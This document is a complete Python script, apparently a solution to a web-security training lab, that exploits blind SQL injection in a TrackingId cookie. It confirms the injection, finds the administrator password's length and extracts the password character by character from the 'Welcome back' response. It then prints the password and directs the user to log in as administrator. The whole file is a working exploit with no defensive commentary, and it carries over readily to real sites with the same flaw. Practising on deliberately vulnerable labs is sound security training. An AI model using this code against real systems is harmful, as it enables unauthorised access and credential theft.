import requests
import string

base_url = input("Enter the base URL of the lab (e.g. https://xxxx.web-security-academy.net): ").rstrip("/")
session = requests.Session()


print("[*] Fetching home page to obtain a valid TrackingId cookie...")
home_response = session.get(base_url)
original_tracking_id = session.cookies.get("TrackingId")

if not original_tracking_id:
    print("==> Error: No TrackingId cookie was set by the server.")
    exit()

print(f"[*] Original TrackingId: {original_tracking_id}")


def send_condition(sql_condition):
    """
    Sends a request with the TrackingId cookie modified to include the given
    SQL condition. Returns True if "Welcome back" appears in the response,
    which means the condition was true.
    """
    payload = f"{original_tracking_id}' AND ({sql_condition})='a"
    cookies = {"TrackingId": payload}
    response = requests.get(base_url, cookies=cookies)
    return "Welcome back" in response.text


print("[*] Confirming the injection point is working...")
true_check = send_condition("SELECT 'a' FROM users LIMIT 1")
if not true_check:
    print("==> Error: Basic injection check failed. Check the lab URL or cookie name.")
    exit()
print("[+] Injection confirmed: 'users' table exists and condition logic works.")


admin_exists = send_condition("SELECT 'a' FROM users WHERE username='administrator'")
if not admin_exists:
    print("==> Error: Could not confirm an 'administrator' user exists.")
    exit()
print("[+] Confirmed: 'administrator' user exists.")


print("\n[*] Determining password length...")
password_length = 0
for length in range(1, 50):
    condition = f"SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{length}"
    if not send_condition(condition):
        password_length = length
        break
    print(f"    Password length is greater than {length}...")

print(f"[+] Password length determined: {password_length} characters")


print("\n[*] Extracting password, one character at a time...")
charset = string.ascii_lowercase + string.digits
found_password = ""

for position in range(1, password_length + 1):
    found_char = None
    for char in charset:
        condition = (
            f"SELECT SUBSTRING(password,{position},1) "
            f"FROM users WHERE username='administrator'"
        )
        payload = f"{original_tracking_id}' AND ({condition})='{char}"
        cookies = {"TrackingId": payload}
        response = requests.get(base_url, cookies=cookies)

        if "Welcome back" in response.text:
            found_char = char
            break

    if found_char is None:
        print(f"    Position {position}: no match found, stopping.")
        break

    found_password += found_char
    print(f"    Position {position}: '{found_char}'  (password so far: {found_password})")

print(f"\n[+] Full password extracted: {found_password}")
print("[*] Go to the login page and log in manually as administrator with this password.")
